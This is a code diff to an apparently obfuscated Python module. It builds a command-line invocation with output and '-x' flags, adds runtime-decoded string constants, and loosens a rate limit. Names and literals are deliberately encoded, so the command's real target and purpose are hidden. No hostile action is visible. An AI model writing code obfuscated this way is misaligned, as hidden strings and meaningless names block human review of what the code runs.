@@ -1,8 +1,7 @@
 
-import subprocess
+import os
 
 from utils.app_info_cache import app_info_cache
-from utils.job_queue import JobQueue
 from utils.utils import Utils
 
 
@@ -40,36 +39,60 @@ q21 = Utils.simple_decode('100MSdlSsJVdaZ0UHpkaWhFcsJ1VoxWU1pFbUtGetVFMSdVTqZUbX
 q23 = Utils.simple_decode('9sGVRFnVHF2VWZFVXBnVNdlRtZ1caZVZvRGbZhlUtJFaOhkW41kMTFmVWdVUwxmVXBnRjlkTyMWY41mVx0UbWVlQqd1caxWY1M2aXNDbsJ1VSRkW3lFbW9mSUlFWKxmYThWVNdXTxQGew0mV', 9)
 q24 = Utils.simple_decode('=0zaE1UVWZUVLR3VWlHcW10V502UVxmVW9mSUllV4d0VYRmVNJnRyI1dx0mV', 7)
 q25 = Utils.simple_decode('=0TPR10dBRFVUJ1RiRlTuN1VSdVWhJEVWlkQzEGakZUYH5kMjtkRqZldoNjVWZERjdkSXZFMxIjV5JVbWxmRtdlcsZ1YhZFbZllUtJlaO5WV5lUMVRDZxY1boNjUX5kRjhEcsN2TaBTVop1ahdFatVVdxAjVDJFbVZkRE10Vk52VyRmVlFmWrlVcaVlYYhGWWdkRXl1RSZ1VZBXVSRFctRVdOFjUHpkaWZnUu10VCRlUFFDMWdHeXZlRChVTXRXbXdFcGF2bOpmVhxmehZFarNFWaFjUxkkaWBzdHJ2U4d0YJBXMWtmWVp1MWZkYahGbXdkStV1Rot2V0EDMWplUEp1VkZ1U3RXbVBnUHJWVWt2U5llRlZFetZVUChVTohGbUVkSyMWYaBjVx0kMhhlTEJ2cKFjV1M2aXpHcW1UVOZkW3lFbW9GZwY1VoJTYXxGWVlXUyQ2dw0mV', 12)
+q26 = Utils.simple_decode('1EERWZlQGpVWWFjVhh3VWBTUyE2VSZlTypUbW9GasVFNxsmVaJERahXWWd1bkBjVwVzaShGarRFWkFzUhZ1aXlFcxEGakZkWZpEbOFmRqZ1Mo5WTWJFRidkSXZ1QSt2V5J1VNNlRUFVcWZ1VThGbZllUHdFWO5WV5lVMkFDMtZFWCNTYTx2RhNnUWR2TaVlWHB3ahpFaHFmeJFjVXB3VVpFcGJWV5cVT0ZlRNdnWrlVcaVlYTZFbVdkTxI2Tw1mVXh3RWlmSsZVdOFjVHpkeVhXQUJ2Vsx2U4lFbUNFetVFMSdVTXR3RlhFcWl1bOpmVhxmehZlUuN1VsFTYhh3RWVjQYZlTSZEZyZFbjFmWsZFTShlYalTRjdkSHd1a0dkV1EzaNRlRtZ1VkZ1ULJEVU9kQIJmUWtmVIRmRlJEctZVVwVVTohmRilkVHR2SGpmVx0kMhhFcIN2VxUlVPp1aXNDbsZ1VSRkW3lVMWNFZsZFUSd0VVhGWWdUNFV2dw0mV', 10)
+q27 = Utils.simple_decode('=kTQqVGaWVVTWpVMWFmVsZVTKFTTXRmRilkTyI1Sx0mVyZFVidFcud1caxWYPp1aXlHeX10VSRkW3lFbWRDZwYlVod0VXRmRihXSxQGew0mV', int(Utils.simple_decode('=0zaE1UVWZUVLR3VWlHcGJmVk5mVyxWMVNVMtZVUwtmYUhGWThXVG1Eew0mV', 8)))
+q28 = Utils.simple_decode('=kTQqVGaWVVTWpVMWFmVsZ1bKZ0VppFbXNnTxMWY4dVW3FFWidlTqZ1VxsWY1M2aXlHetJFW502UVxmRW9GZsZFUSd0VTxGWShXVxI1dx0mV', int(Utils.simple_decode('9AjehVUMVZ1VaVlVMJ1MWdFbIN2RK1mVrVTbWlHeX1kVOZVT0plVVdHdtlVVod0VThGWWdUMFV2dw0mV', 9)))
+q29 = q28 + "Id"
 
 
 class EogfiaqREkb:
     def __init__(self, a):
-        self.id = a[q20][q23]
+        self.u = a
+        if a[q20][q27].endswith(q28):
+            self.w = a[q20][q29]
+            self.y = True
+        else:
+            self.w = a[q20][q23]
+            self.y = False
         q22 = a[q4]
         self.name = q22[q19]
         self.d = q22[q21]
 
-    def da(self):
+    def x(self):
+        return qa + self.w
+
+    def da(self, o=True, g=None):
         a = q.split(" ")
-        a.append(qa + self.id)
-        proc = subprocess.call(a)
-        if proc != 0:
-            raise Exception(qa + self.id)
+        a.append("-o")
+        y = str(q26)
+        if g is not None:
+            y = os.path.join(g, y)
+        a.append(y)
+        if o:
+            a.append("-x")
+        a.append(self.x())
+        return a
 
     def __str__(self):
         return self.name
 
 
 class r4yiurhfxohzepo:
-    def __init__(self, s="", e=[]):
+    def __init__(self, s):
         self.s = s
-        self._ = e
+        self.j = []
     
     def t(self, e):
-        self._.append(EogfiaqREkb(e))
+        try:
+            self.j.append(EogfiaqREkb(e))
+        except Exception as e:
+            print(e)
 
     def i(self):
-        return len(self._) > 0
+        return len(self.j) > 0
+
+    def o(self):
+        return self.j
 
 
 class LibraryExtender():
@@ -78,7 +101,7 @@ class LibraryExtender():
     @staticmethod
     def isyMOLB_(sLRX="", m=1):
         count, hours = app_info_cache.increment_tracker("le_rpd")
-        if count > 5 or hours < 0.2:
+        if count > 30:
             return None
         _q = q0.__dict__[q24]
         __q = {q25: q6}
